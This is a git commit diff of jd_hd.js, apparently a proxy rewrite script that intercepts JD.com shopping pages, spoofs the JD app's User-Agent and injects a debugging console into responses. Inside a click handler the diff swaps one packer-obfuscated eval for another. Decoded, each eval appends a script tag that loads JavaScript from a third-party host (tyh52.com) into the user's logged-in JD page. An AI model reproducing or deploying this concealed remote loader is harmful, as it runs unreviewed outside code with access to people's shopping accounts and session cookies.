217f441a8f25446c95f8fc63bd84377ab1969fe3
qazmcl1230 <40729710+qazmcl1230@users.noreply.github.com>
2020-10-27 11:17:47 +0800

    Update jd_hd.js

--- jd_hd.js
+++ jd_hd.js
@@ -1,10 +1,16 @@
 /*
 我是搬运工
 
-[rewrite_local]
-https://xeq1kjnhr\.m\.jd\.com/static/index\.html url script-response-body https://raw.githubusercontent.com/ZhiYi-N/Loon/master/jd_hd.js
-[mitm]
-xeq1kjnhr.m.jd.com
+ * 活动地址: https://bunearth.m.jd.com/babelDiy/Zeus/4SJUHwGdUQYgg94PFzjZZbGZRjDd/index.html
+ ********  ********
+
+hostname = bunearth.m.jd.com, api.m.jd.com
+
+^https:\/\/api\.m\.jd\.com url request-header (\r\n)User-Agent:.+(\r\n) request-header $1User-Agent: jdapp;android;8.4.2;8.0.0;;network/wifi;model/Mi Note 2;osVer/26;appBuild/71043;psn/|7;psq/1;uid/;adk/;ads/;pap/JA2015_311210|8.4.2|ANDROID 8.0.0;osv/8.0.0;pv/2.23;jdv/;ref/com.jingdong.app.mall.WebActivity;partner/huawei;apprpd/Home_Main;Mozilla/5.0 (Linux; Android 8.0.0; Mi Note 2 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36$2
+
+^https:\/\/bunearth\.m\.jd\.com\/babelDiy\/Zeus url script-response-body https://raw.githubusercontent.com/qazmcl1230/qx/master/jd_hd.js
+
+ ********
 
 */
 let html = $response.body
@@ -69,7 +75,7 @@ html = html.replace(/(<\/html>)/g, "") +
           onClick: function (event) {
             vConsole.showTab("default");
             
-            eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}(' e 9=4.3(\\'9\\');9.d=\"b/6\";9.a=\"5://c.2/8/7.8\";4.1.0(9);',62,15,'appendChild|body|com|createElement|document|https|javascript|jdggel|js|script|src|text|tyh52|type|var'.split('|'),0,{}))
+           eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}(' e 9=4.3(\'9\');9.d="b/6";9.a="5://c.2/8/7.8";4.1.0(9);',62,15,'appendChild|body|com|createElement|document|https|javascript|jdqmyy|js|script|src|text|tyh52|type|var'.split('|'),0,{}))
 
           },
         });
